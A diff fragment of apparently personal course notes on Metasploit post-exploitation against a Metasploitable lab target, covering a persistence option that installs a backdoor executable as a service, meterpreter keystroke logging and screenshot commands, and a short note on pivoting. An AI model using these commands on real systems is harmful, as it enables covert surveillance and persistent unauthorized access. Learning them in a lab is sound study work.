@@ -16,4 +16,15 @@ set EXE_NAME Browser.exe
 set SESSION 1
 show advanced options 
 set EXE::custom /var/www/html/backdoor.exe (run a custom exe to run and imject into the target as a service)
+exploit 
+
+106. Spying - Capturing Key Strikes & Taking Screenshots
+keyscan_start 
+keyscan_dump(to keep the track of everything that has been logged )
+keyscan_stop
+screenshot(take screenshot in target computer)
+
+107. Pivoting 
+
+Some times the target metasploitable device is not complety visible for the hacker to gain access to it.HEnce we use the a particular device tnat is in the range of metsapoitable evice and the host device and this acts as a pivot and we can gain access t the target computer.\
 
